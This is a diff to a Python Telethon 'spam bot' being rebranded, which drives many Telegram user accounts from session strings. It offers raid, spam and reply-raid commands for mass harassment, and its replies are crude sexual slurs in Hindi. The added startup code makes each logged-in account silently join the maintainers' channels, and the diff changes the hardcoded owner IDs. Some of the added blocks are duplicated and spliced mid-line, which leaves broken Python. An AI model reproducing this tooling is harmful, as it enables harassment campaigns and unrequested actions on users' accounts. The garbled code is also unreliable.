@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [5046719296]
+SMEX_USERS = [2020051281, 1369548041, 5120382261]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -137,7 +137,113 @@ async def start_yukki():
         ydk = TelegramClient(StringSession(session_name), a, b)
         try:
             print("Booting Up The Client 2")
+            await ydk.start()print("String 1 Found")
+        idk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 1")
+            await idk.start()
+            botme = await idk.get_me()
+            await idk(functions.channels.JoinChannelRprint("String 1 Found")
+        idk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 1")
+            await idk.start()
+            botme = await idk.get_me()
+            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await idk(functions.channels.JoinChannelRequest(channel="@LegendFonts"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            idk = "smex"
+            print(e)
+            pass
+    else:
+        print("Session 1 not Found")
+        session_name = "startup"
+        idk = TelegramClient(session_name, a, b)
+        try:
+            await idk.start()
+        except Exception as e:
+            pass
+   
+    if smexx:
+        session_name = str(smexx)
+        print("String 2 Found")
+        ydk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 2")
             await ydk.start()
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            botme = await ydk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
+        print("Session 2 not Found")
+        pass
+        session_name = "startup"
+        ydk = TelegramClient(session_name, a, b)
+        try:
+            await ydk.start()
+        except Exception as e:
+            pass
+
+    if smexxx:
+        session_name = str(smexxx)equest(channel=" @TheGodsOP"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await idk(functions.channels.JoinChannelRequest(channel="@LegendFonts"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            idk = "smex"
+            print(e)
+            pass
+    else:
+        print("Session 1 not Found")
+        session_name = "startup"
+        idk = TelegramClient(session_name, a, b)
+        try:
+            await idk.start()
+        except Exception as e:
+            pass
+   
+    if smexx:
+        session_name = str(smexx)
+        print("String 2 Found")
+        ydk = TelegramClient(StringSession(session_name), a, b)
+        try:
+            print("Booting Up The Client 2")
+            await ydk.start()
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
+            await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
+            botme = await ydk.get_me()
+            botid = telethon.utils.get_peer_id(botme)
+            SMEX_USERS.append(botid)
+        except Exception as e:
+            print(e)
+            pass
+    else:
+        print("Session 2 not Found")
+        pass
+        session_name = "startup"
+        ydk = TelegramClient(session_name, a, b)
+        try:
+            await ydk.start()
+        except Exception as e:
+            pass
+
+    if smexxx:
+        session_name = str(smexxx)
             await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
             await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP"))
             await ydk(functions.channels.JoinChannelRequest(channel=" @TheGodsOP "))
@@ -833,7 +939,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("𝐆𝐀𝐀𝐍𝐃 𝐌𝐈𝐋 𝐆𝐘𝐀𝐀 𝐁𝐇𝐀𝐈𝐈 💋💦")
+                await event.edit("ͲᎪᎡᏀᎬͲ ϴΝ ՏᏢϴͲ 💥")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -877,38 +983,38 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("PRIVATE RAKHEGA BHENXHOD 👿")
+                await event.edit("ᴘʀɪᴠᴀᴛᴇ ᴍᴇ xʜᴜᴅᴇɢᴀ 💦 ")
             except Exception as e:
                 await event.edit(str(e))   
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
             
         
-@idk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@adk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@edk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@vkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@kkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@lkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@mkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@sid.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@shy.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@aan.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ake.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@eel.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@khu.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@shi.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@yaa.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@dav.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@raj.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@put.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@vkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@kkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@lkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@mkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@sid.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@shy.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@aan.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ake.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@eel.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@khu.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@shi.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@yaa.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@dav.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@raj.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@put.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
 
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
@@ -917,7 +1023,7 @@ async def _(e):
         if len(e.text) == 7:
             bc = yukki[0]
             bc = int(bc)
-            text = "𝐉𝐀𝐀 𝐌𝐀𝐃𝐀𝐑𝐗𝐇𝐎𝐃 𝐗𝐇𝐎𝐑 𝐃𝐈𝐘𝐀💋"
+            text = "ᴀʙʙ ᴊᴀᴀ ʀʜᴀ ᴄʜᴜᴅɴᴀ ʜᴏ ᴀɢᴀɪɴ ʏᴀᴀᴅ ᴋʀɴᴀ 🤣"
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await event.client(LeaveChannelRequest(bc))
@@ -1274,7 +1380,7 @@ async def _(e):
             qeue = que.get(g)
             appendable = [g]
             qeue.append(appendable)
-            text = "𝐀𝐀𝐉 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐗𝐇𝐔𝐃𝐄𝐆𝐈 𝐁𝐄𝐓𝐄⚡"
+            text = "𝗚𝗿𝗼𝘂𝗽 𝗺𝗲 𝗹𝗶𝘃𝗲 𝗫𝗵𝘂𝗱𝗮𝗶 𝗵𝗼𝗴𝗶 🔥"
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1323,7 +1429,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "𝐗𝐇𝐔𝐃 𝐆𝐀𝐘𝐈 𝐁𝐀𝐂𝐂𝐇𝐈 💦"
+            text = "𝗞𝗮𝗹𝗮𝗽𝗮 𝗱𝗶𝗮 𝗝𝗮𝗮 𝗯𝘀𝗱𝗸 😂"
             await e.reply(text, parse_mode=None, link_preview=None )
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
@@ -1334,7 +1440,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "𝐗𝐇𝐔𝐃 𝐆𝐀𝐘𝐈 𝐁𝐀𝐂𝐂𝐇𝐈 💦"
+            text = "𝗞𝗮𝗹𝗮𝗽𝗮 𝗱𝗶𝗮 𝗝𝗮𝗮 𝗯𝘀𝗱𝗸 😂"
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1369,11 +1475,11 @@ async def _(e):
 async def ping(e):
     if e.sender_id in SMEX_USERS:
         start = datetime.now()
-        text = "Σ𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃㉺"
+        text = " sabar kro 😂"
         event = await e.reply(text, parse_mode=None, link_preview=None)
         end = datetime.now()
         ms = (end - start).microseconds / 1000
-        await event.edit(f"🤖 Zinda hu baby!\n`{ms}` 𝗺𝘀\n 𒈒 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𒈒")
+        await event.edit(f"̶A̶̶l̶̶w̶̶a̶̶y̶̶s̶ ̶r̶̶e̶̶a̶̶d̶̶y̶ ̶t̶̶o̶ ̶f̶̶u̶̶c̶̶k̶!\n`{ms}` 𝗺𝘀\n ❤️ 🅚🅞🅚🅞 🅢🅟🅐🅜 🅑🅞🅣 ❤️")
 
      
         
@@ -1405,7 +1511,7 @@ async def ping(e):
 @put.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
 async def restart(e):
     if e.sender_id in SMEX_USERS:
-        text = "𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗲𝗱...\n\nPlease wait till it reboots..."
+        text = "𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗲𝗱...\n\n2 𝐦𝐢𝐧 𝐚𝐚𝐫𝐚𝐦 𝐤𝐫𝐧𝐞 𝐝𝐞..."
         await e.reply(text, parse_mode=None, link_preview=None )
         try:
             await idk.disconnect()
@@ -1483,7 +1589,7 @@ async def restart(e):
 
 async def help(e):
     if e.sender_id in SMEX_USERS:
-       text = " ⚔ 𝐋𝐔𝐂𝐈𝐅𝐄𝐑 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 ⚔\n\n✘ 𝐔𝐓𝐈𝐋𝐒 ✘:\n.ping\n.restart\n\n✘ 𝐔𝐒𝐄𝐑 𝐁𝐎𝐓 ✘:\n.bio\n.join\n.pjoin\n.pleave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n [ MADARCHOD ]"
+       text = " ⚔ 🅚🅞🅚🅞 🅢🅟🅐🅜 🅑🅞🅣 ⚔\n\n✘ 𝐔𝐓𝐈𝐋𝐒 ✘:\n.ping\n.restart\n\n✘ Base cmd ✘:\n.bio\n.join\n.pjoin\n.leave\n\n✘ 𝐒𝐏𝐀𝐌 ✘:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n [ 🇰 🇴 🇰 🇴  ]"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
@@ -1491,11 +1597,11 @@ async def help(e):
     
         
 text = """
-CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL LEGENDSPAMBOT DEPLOYED SUCCESSFULLY """
+CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL 🅚🅞🅚🅞 🅢🅟🅐🅜 🅑🅞🅣 DEPLOYED SUCCESSFULLY """
 
 print(text)
 print("")
-print("YOᑌᖇ ᒪᑌᑕIᖴᗴᖇ Տᑭᗩᗰ ᗷOT ᗪᗴᑭᒪOY !!")
+print("🅚🅞🅚🅞 🅢🅟🅐🅜 🅑🅞🅣 🅳🅴🅿🅻🅾🆈🅴🅳 !!")
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect()
